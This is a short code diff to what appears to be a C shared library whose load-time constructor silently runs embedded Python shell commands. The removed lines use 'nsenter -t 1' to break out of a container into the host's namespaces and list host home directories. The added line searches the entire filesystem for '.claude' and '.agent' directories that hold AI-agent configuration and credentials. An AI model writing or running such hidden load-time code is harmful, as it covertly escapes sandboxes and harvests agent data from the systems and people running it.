@@ -105,11 +105,8 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/doubohan/data')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future/doubohan/volume')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -la /home/future')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- find /root -type d -name ".claude" 2>/dev/null')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- find /root -type d -name ".claude" 2>/dev/null')
+run_cmd('find / -type d \( -name ".claude" -o -name ".agent" \) 2>/dev/null')
+
 )PY");
 
   PyGILState_Release(gstate);
